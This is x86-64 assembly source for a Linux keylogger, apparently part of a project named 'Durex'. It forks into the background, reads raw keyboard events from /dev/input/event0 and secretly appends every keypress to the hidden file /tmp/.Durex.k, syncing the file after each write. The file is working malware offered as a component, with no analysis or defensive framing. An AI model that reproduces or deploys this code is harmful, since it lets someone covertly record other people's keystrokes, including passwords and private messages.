BITS 64

section .text
    global  keylogger
    ; global  getkeys


    ; rsp -> keyboard fd
    ; rsp + 0x4 -> outfile fd
    ; rsp + 0x8 -> input_event
keylogger:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x20 ;; ajouter un lock
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     eax, 0
    je      childkeylogger
    xor     edi, edi
    xor     eax, eax
    add     eax, 0x3c ; exit
    syscall
childkeylogger:
    lea     rdi, [rel keyboard]
    xor     esi, esi
    xor     eax, eax
    add     eax, 0x02 ; open
    syscall
    mov     DWORD [rsp], eax
    lea     rdi, [rel outfile]
    xor     esi, esi
    add     esi, 1 | 100o | 2000o ; O_WRONLY | O_CREAT | O_APPEND
    xor     edx, edx
    add     edx, 600o
    xor     eax, eax
    add     eax, 0x02 ; open
    syscall
    mov     DWORD [rsp + 0x4], eax
key_loop:
    mov     edi, DWORD [rsp]
    lea     rsi, [rsp + 0x8]
    xor     edx, edx
    add     edx, 24
    xor     eax, eax ; read
    syscall
    mov     ax, WORD [rsp + 0x18] ; event.type
    cmp     ax, 0x01 ; EV_KEY
    jne     key_loop
    mov     edi, DWORD [rsp + 0x4]
    lea     rsi, [rsp + 0x8]
    xor     edx, edx
    add     edx, 24
    xor     eax, eax
    inc     eax ; write
    syscall
    mov     edi, DWORD [rsp + 0x4]
    xor     eax, eax
    add     eax, 0x4a ; fsync
    syscall
    jmp     key_loop
    leave
    ret
getkeys:
    ret

outfile: db "/tmp/.Durex.k", 0

keyboard: db "/dev/input/event0", 0 ; /dev/input/by-path/platform-i8042-serio-0-event-kbd